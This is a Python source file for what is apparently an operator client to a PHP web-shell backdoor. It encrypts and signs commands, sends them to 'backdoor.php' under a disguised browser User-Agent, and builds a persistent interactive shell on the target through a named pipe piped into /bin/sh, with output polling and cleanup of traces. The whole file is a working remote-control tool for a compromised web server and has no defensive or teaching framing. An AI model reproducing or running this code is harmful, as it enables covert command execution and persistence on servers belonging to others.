from OpenSSL import crypto
from Crypto.Cipher import AES
import OpenSSL
import hashlib
import readline
import requests
import threading
import random
import base64
import time
import os


global URL
global HEADERS
global FUNCTION
global CUSTOM_FUNCTION_ENABLED


# ---------------- CONFIGURATION ---------------- #

PRIVATE_KEY_LOCATION = "./signing/private.key"
PUBLIC_KEY_LOCATION = "./signing/public.key"
AES_KEY = '---YOUR AES KEY HERE---'
AES_IV = '---YOUR AES IV HERE---'

URL = "http://127.0.0.1/backdoor.php"
HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36'}
CMDFILE0 = "/dev/shm/in"
CMDFILE1 = "/dev/shm/out"
CMDFILEPID = "/dev/shm/pid"
INTERVAL = 1.3

PROMPT = "---> "

CUSTOM_FUNCTION_ENABLED = 0
FUNCTION = "shell_exec"

# ----------------------------------------------- #


class AESCipher:
	def __init__(self, key, iv):
		self.key = hashlib.sha256(key.encode('utf-8')).hexdigest()[:32].encode("utf-8")
		self.iv = hashlib.sha256(iv.encode('utf-8')).hexdigest()[:16].encode("utf-8")

	__pad = lambda self, s: s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
	__unpad = lambda self, s: s[0:-ord(s[-1])]

	def encrypt(self, raw):
		raw = self.__pad(raw)
		cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
		return base64.b64encode(cipher.encrypt(raw.encode("utf-8")))

	def decrypt(self, enc):
		enc = base64.b64decode(enc)
		cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
		return self.__unpad(cipher.decrypt(enc).decode("ISO-8859-1"))


def sign_cmd(cmd):
	signed = OpenSSL.crypto.sign(PRIKEY, cmd, "sha512")
	result = base64.b64encode(base64.b64encode(signed))
	return result.decode()


def verify_cmd(cmd, signature):
	signature = base64.b64decode(base64.b64decode(signature))
	res = OpenSSL.crypto.verify(CERT, signature, cmd, "sha512")
	if res is None:
		return("Verified")
	else:
		return("Failed")


def send_cmd(cmd, custom_func=FUNCTION):
	crypted_cmd = CIPHER_AES.encrypt(cmd)
	sign = sign_cmd(crypted_cmd)
	verification = verify_cmd(crypted_cmd, sign)
	if verification == "Failed":
		print(f"Verification : {verification}, check if private key and public key are correct!")

	if CUSTOM_FUNCTION_ENABLED:
		crypted_func = CIPHER_AES.encrypt(custom_func)
		data = {"command": crypted_cmd, "b64": "base64_decode", "func": crypted_func, "signature": sign}
		result = requests.post(URL, headers=HEADERS, data=data)
		result = CIPHER_AES.decrypt(result.text)
	else:
		data = {"command": crypted_cmd, "b64": "base64_decode", "signature": sign}
		result = requests.post(URL, headers=HEADERS, data=data)
		result = CIPHER_AES.decrypt(result.text)
	return result


def init_crypto():
	global PRIKEY
	global PUBKEY
	global CIPHER_AES
	global CERT

	private_key_file = open(PRIVATE_KEY_LOCATION, "r")
	public_key_file = open(PUBLIC_KEY_LOCATION, "r")
	private_key_content = private_key_file.read()
	public_key_content = public_key_file.read()
	private_key_file.close()
	public_key_file.close()
	CERT = OpenSSL.crypto.X509()

	PRIKEY = crypto.load_privatekey(crypto.FILETYPE_PEM, private_key_content)
	PUBKEY = crypto.load_publickey(crypto.FILETYPE_PEM, public_key_content)
	CERT.set_pubkey(PUBKEY)

	CIPHER_AES = AESCipher(AES_KEY, AES_IV)


def init_mkfifo():
	global CMDFILE0
	global CMDFILE1
	global CMDFILEPID

	sessid = random.randrange(100000, 999999)
	CMDFILE0 = f"{CMDFILE0}-{sessid}"
	CMDFILE1 = f"{CMDFILE1}-{sessid}"
	CMDFILEPID = f"{CMDFILEPID}-{sessid}"

	mkfifo_init = f"mkfifo {CMDFILE0}; tail -f {CMDFILE0} | /bin/sh 2>&1 > {CMDFILE1} 2>&1 & echo $! >> {CMDFILEPID}"
	send_cmd(mkfifo_init, "exec")
	print(f"SHELL FILES ARE : {CMDFILE0}, {CMDFILE1}, {CMDFILEPID}")

	thread = threading.Thread(target=read_thread, args=())
	thread.daemon = True
	thread.start()


def send_fifo(cmd):
	template = f"echo '{cmd}' > {CMDFILE0}"
	send_cmd(template)
	time.sleep(INTERVAL * 1.01)


def read_thread():
	rd_template = f"/bin/cat {CMDFILE1}"
	clr_template = f'echo -n "" > {CMDFILE1}'
	while True:
		out = send_cmd(rd_template)
		if out:
			print(out)
			send_cmd(clr_template)
		time.sleep(INTERVAL)


def clean_up():
	print("Cleaning Up...")
	print("Killing mkfifo shell...")
	send_cmd(f"kill -9 $(cat {CMDFILEPID})")
	send_cmd(f"kill -9 $(($(cat {CMDFILEPID}) - 1))")
	print(f"Removing Files: {CMDFILE0}, {CMDFILE1}, {CMDFILEPID}")
	send_cmd(f"rm -rf {CMDFILE0} {CMDFILE1} {CMDFILEPID}")


def main():
	init_crypto()
	init_mkfifo()

	while True:
		try:
			cmd = input(PROMPT)
			if cmd == "EXIT":
				print("Exiting...")
				clean_up()
				break
			send_fifo(cmd)
		except KeyboardInterrupt:
			print("Exiting...")
			clean_up()
			exit()
		except requests.ConnectionError as err:
			print(f"A connection error occurred: {err}")
			exit()


if __name__ == '__main__': 
	main()